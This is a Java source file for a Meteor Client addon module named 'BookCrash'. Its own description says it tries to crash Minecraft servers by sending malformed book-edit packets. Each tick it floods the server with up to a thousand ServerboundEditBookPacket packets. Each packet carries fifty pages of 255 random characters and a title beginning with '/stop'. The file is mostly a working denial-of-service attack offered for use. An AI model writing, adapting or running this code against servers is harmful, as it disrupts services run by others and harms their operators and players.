package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.core.component.DataComponents;
import net.minecraft.network.chat.Component;
import net.minecraft.network.protocol.game.ServerboundEditBookPacket;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import org.apache.commons.lang3.RandomStringUtils;
import widecat.meteorcrashaddon.CrashAddon;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

public class BookCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("Which type of packet to send.")
        .defaultValue(Mode.BookUpdate)
        .build());

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(100)
        .min(1)
        .sliderMax(1000)
        .build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build());

    public BookCrash() {
        super(CrashAddon.CATEGORY, "book-crash", "Tries to crash the server by sending bad book sign packets.");
    }
    int slot = 5;

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (Utils.canUpdate()) {
            for (int i = 0; i < amount.get(); i++) sendBadBook();
        }
    }

    private void sendBadBook() {
        String title = "/stop" + Math.random() * 400;
        String mm255 = RandomStringUtils.randomAlphanumeric(255);

        switch (mode.get()) {
            case BookUpdate -> {
                ArrayList<String> pages = new ArrayList<>();

                for (int i = 0; i < 50; i++) {
                    StringBuilder page = new StringBuilder();
                    page.append(mm255);
                    pages.add(page.toString());
                }

                mc.player.connection.send(new ServerboundEditBookPacket(mc.player.getInventory().getSelectedSlot(), pages, Optional.of(title)));
            }
            case Creative -> {
                // Creative mode book crash disabled for 1.21.11 compatibility
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Mode {
        BookUpdate,
        Creative
    }
}
